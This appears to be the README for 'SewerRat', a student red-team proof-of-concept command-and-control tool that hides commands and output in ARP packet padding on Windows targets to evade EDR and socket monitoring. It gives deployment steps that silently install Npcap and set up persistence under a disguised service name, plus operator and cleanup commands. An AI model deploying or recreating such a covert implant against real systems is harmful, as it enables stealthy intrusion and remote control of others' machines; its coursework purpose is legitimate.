# SewerRat: Layer 2 Command & Control Framework

```
╔═══════════════════════════════════════════════════════════════╗
║                      SewerRat C2 (PoC)                        ║
║                 Layer 2 ARP-Based Stealth C2                  ║
║                                                               ║
║  "Under the radar of EDR/NDR that watches layer 3+"           ║
╚═══════════════════════════════════════════════════════════════╝
```

## Overview

**SewerRat** is a proof-of-concept **Layer 2 Command & Control framework** that embeds command and response data in ARP packet padding to bypass traditional socket-based detection, firewall rules, and EDR network monitoring.

This tool is designed specifically for **CSEC-473 (Cyber Defense Techniques)** as part of **Homework #4: Red Team Tool**.

### Key Features
✅ **Layer 2 Stealth** — Operates at Data Link layer (ARP), not TCP/UDP  
✅ **No Sockets** — Implant creates no listening ports (netstat-proof)  
✅ **Firewall-Silent** — ARP is pre-approved and essential for network function  
✅ **Windows Target** — Designed to be deployed to Windows Server 2022 targets  
✅ **Lightweight Implant** — Single static Go binary with minimal memory overhead  
✅ **Interactive C2** — Real-time command execution from Linux operator  

---

## 🛠 Prerequisites for Deployment

To successfully run and test SewerRat, you need:
1. The **compiled SewerRat.exe implant** located in the `dist/` folder. (You can compile it yourself by running `make all` in the `sewerrat/` folder)
2. The **npcap-1.87.exe installer** (required for capturing Layer 2 traffic on Windows).
3. The **Ansible Playbook** (`deploy_sewerrat.yml`) or the manual fallback tools in `scripts/`.
4. The compiled Linux **sewerrat-server** binary to dispatch commands.

---

## 🚀 Quick Deployment Guide

### Option 1: Automated Deployment using Ansible (Primary Method)
The preferred method of deployment is using Ansible from your Linux operator machine. Ensure `deploy_sewerrat.yml` and `inventory.ini` are present along with your payloads.

1. **Configure Inventory:** Update `inventory.ini` with your target IP and Administrator credentials.
2. **Execute Playbook:**
   ```bash
   ansible-playbook -i inventory.ini ../deploy_sewerrat.yml
   ```
   *Ansible will automatically copy dependencies, silently install Npcap, deploy the implant, and launch it implicitly.*

### Option 2: Manual Deployment using SCP & PowerShell (Fallback)
If Ansible is unavailable, use the bundled SCP and PowerShell scripts to manually stage the implant.

1. **Push Files to Target:** From Linux, execute the following script to transfer the implant and its dependencies.
   ```bash
   ./scripts/scp-method.sh -t <target_windows_ip> -u <username>
   ```
2. **Run Deployment Script:** SSH or WinRM into the target Windows host and run the deployment script as Administrator.
   ```powershell
   cd C:\Windows\Temp
   .\deploy.ps1
   ```
   *The PowerShell script installs Npcap silently, moves the implant to a system directory, and establishes persistence.*

---

## 💻 Operating the C2 Server

After the implant is active on the target Windows system, start the C2 Server on your Linux operator machine.

### 1. Launch Server
Ensure you run it with `sudo` so it has privileges to sniff and broadcast ARP packets:
```bash
sudo ./dist/sewerrat-server -i eth0
```
*(Replace `eth0` with whatever network interface connects you to the target).*

### 2. Send Commands
Once in the SewerRat CLI, you can start issuing interactive commands:

```bash
sewerrat> broadcast whoami
[>>] Sent command: whoami
[*] Waiting for responses...
[<<] 00:11:22:33:44:55: DOMAIN\Administrator

sewerrat> send 00:11:22:33:44:55 ipconfig /all
[<<] 00:11:22:33:44:55: Windows IP Configuration...

sewerrat> exit
```

---

## 📝 How It Works

1. **Implant Beacon:** The Windows target sends an ARP Request for a non-existent IP (10.255.255.254) with a beacon message securely tucked in the Ethernet padding.
2. **Command Delivery:** The Linux C2 server identifies the beacon and responds with an ARP Reply containing an encoded command hidden in the padding.
3. **Execution:** The implant sniffs for a specific magic marker (`0x13 0x37`), extracts the command string, and executes it silently via `cmd /c`.
4. **Response:** Output is split into 20-byte payload chunks and covertly transmitted back over multiple ARP Replies.

Because SewerRat operates exclusively at Layer 2, tools monitoring Layer 3/4 sockets (like `netstat` and standard EDR pipelines) will not observe the C2 traffic.

---

## 🧹 Cleanup Instructions

If testing locally or wishing to remove artifacts post-engagement, execute these commands on the target Windows machine as Administrator:
```powershell
Stop-Service -Name "Win32NetworkBuffer" -ErrorAction SilentlyContinue
sc.exe delete "Win32NetworkBuffer"
Remove-Item -Path "C:\Windows\System32\drivers\SewerRat.exe" -Force
```

---
*Note: This project is intended strictly for authorized educational purposes and red-team operational simulation.*
